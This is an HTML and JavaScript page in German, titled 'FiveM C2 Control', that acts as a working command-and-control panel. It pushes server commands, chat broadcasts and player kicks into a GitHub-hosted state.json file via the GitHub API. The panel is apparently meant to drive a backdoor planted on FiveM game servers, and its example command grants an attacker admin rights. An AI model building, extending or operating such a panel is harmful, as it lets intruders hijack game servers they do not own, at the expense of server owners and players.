<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM C2 Control</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: #e0e0e0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .container { background-color: #2d2d2d; padding: 2.5rem; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); width: 90%; max-width: 600px; text-align: center; }
        h1 { color: #e74c3c; margin-bottom: 1.5rem; font-size: 1.8rem; }
        .tabs { display: flex; margin-bottom: 1.5rem; border-bottom: 2px solid #444; }
        .tab { flex: 1; padding: 10px; cursor: pointer; border: none; background: none; color: #bdc3c7; font-size: 1rem; }
        .tab.active { color: #e74c3c; border-bottom: 2px solid #e74c3c; }
        .tab-content { display: none; text-align: left; }
        .tab-content.active { display: block; }
        .input-group { margin-bottom: 1.5rem; }
        label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; color: #bdc3c7; }
        input[type="text"], input[type="password"], textarea { width: 100%; padding: 12px; border: 1px solid #555; border-radius: 6px; background-color: #444; color: #fff; box-sizing: border-box; font-size: 1rem; }
        textarea { min-height: 100px; resize: vertical; }
        button { width: 100%; padding: 12px; border: none; border-radius: 6px; background-color: #c0392b; color: white; font-size: 1rem; font-weight: bold; cursor: pointer; transition: background-color 0.3s ease; }
        button:hover { background-color: #a93226; }
        #status { margin-top: 1.5rem; font-size: 0.9rem; min-height: 20px; text-align: center; }
        .success { color: #2ecc71; }
        .error { color: #e74c3c; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 FiveM C2 Control</h1>
        <div class="tabs">
            <button class="tab active" onclick="showTab('command')">Befehl</button>
            <button class="tab" onclick="showTab('chat')">Chat</button>
            <button class="tab" onclick="showTab('players')">Spieler</button>
        </div>

        <!-- Tab 1: Befehl -->
        <div id="command" class="tab-content active">
            <div class="input-group">
                <label for="tokenInput">GitHub Token</label>
                <input type="password" id="tokenInput" placeholder="Dein Personal Access Token">
            </div>
            <div class="input-group">
                <label for="commandInput">Server-Befehl</label>
                <input type="text" id="commandInput" placeholder="z.B. add_principal identifier.steam:xxx group.admin">
            </div>
            <button onclick="updateState()">Befehl senden</button>
        </div>

        <!-- Tab 2: Chat -->
        <div id="chat" class="tab-content">
            <div class="input-group">
                <label for="chatMessageInput">Chat-Nachricht</label>
                <textarea id="chatMessageInput" placeholder="Nachricht, die an alle Spieler gesendet wird."></textarea>
            </div>
            <button onclick="updateState()">Nachricht senden</button>
        </div>

        <!-- Tab 3: Spieler -->
        <div id="players" class="tab-content">
            <div class="input-group">
                <label for="kickPlayerInput">Spieler kicken (ID)</label>
                <input type="text" id="kickPlayerInput" placeholder="z.B. 1">
            </div>
            <button onclick="updateState()">Spieler kicken</button>
        </div>

        <div id="status">Bereit.</div>
    </div>

    <script>
        // --- KONFIGURATION (Bereits für dich angepasst) ---
        const GITHUB_USERNAME = "vSkeezy";
        const REPO_NAME = "fivem-c2";
        // Wir verwenden jetzt state.json statt command.txt
        const STATE_FILE_PATH = "state.json";

        const API_URL = `https://api.github.com/repos/${GITHUB_USERNAME}/${REPO_NAME}/contents/${STATE_FILE_PATH}`;

        // Tab-Wechsel Logik
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
            document.querySelector(`button[onclick="showTab('${tabName}')"]`).classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }

        // Hauptfunktion, um den Status zu aktualisieren
        async function updateState() {
            const token = document.getElementById('tokenInput').value;
            const statusDiv = document.getElementById('status');

            if (!token) {
                statusDiv.textContent = '❌ Token ist erforderlich.';
                statusDiv.className = 'error';
                return;
            }

            statusDiv.textContent = 'Sende...';
            statusDiv.className = '';

            try {
                // 1. Hole die aktuellen Datei-Infos
                const getFileResponse = await fetch(API_URL, { headers: { 'Authorization': `token ${token}` } });
                if (!getFileResponse.ok && getFileResponse.status !== 404) throw new Error(`Fehler beim Abrufen: ${getFileResponse.statusText}`);
                
                let fileData = { sha: '' }; // Standard für neue Datei
                if (getFileResponse.status !== 404) {
                    fileData = await getFileResponse.json();
                }

                // 2. Sammle Daten aus den aktiven Tabs
                const state = {
                    command: document.getElementById('commandInput').value || "",
                    chatMessage: document.getElementById('chatMessageInput').value || "",
                    kickPlayer: document.getElementById('kickPlayerInput').value || ""
                };

                // 3. Bereite das Update vor
                const content = btoa(unescape(encodeURIComponent(JSON.stringify(state))));
                const body = JSON.stringify({
                    message: `Update state`,
                    content: content,
                    sha: fileData.sha
                });

                // 4. Sende den Update-Request
                const updateResponse = await fetch(API_URL, {
                    method: 'PUT',
                    headers: { 'Authorization': `token ${token}`, 'Content-Type': 'application/json' },
                    body: body
                });

                if (updateResponse.ok) {
                    statusDiv.textContent = '✅ Status aktualisiert!';
                    statusDiv.className = 'success';
                    // Leere die Eingabefelder nach dem Senden
                    document.getElementById('commandInput').value = '';
                    document.getElementById('chatMessageInput').value = '';
                    document.getElementById('kickPlayerInput').value = '';
                } else {
                    const errorData = await updateResponse.json();
                    throw new Error(`Fehler beim Senden: ${updateResponse.statusText}. ${errorData.message}`);
                }

            } catch (error) {
                statusDiv.textContent = `❌ ${error.message}`;
                statusDiv.className = 'error';
            }
        }
    </script>
</body>
</html>
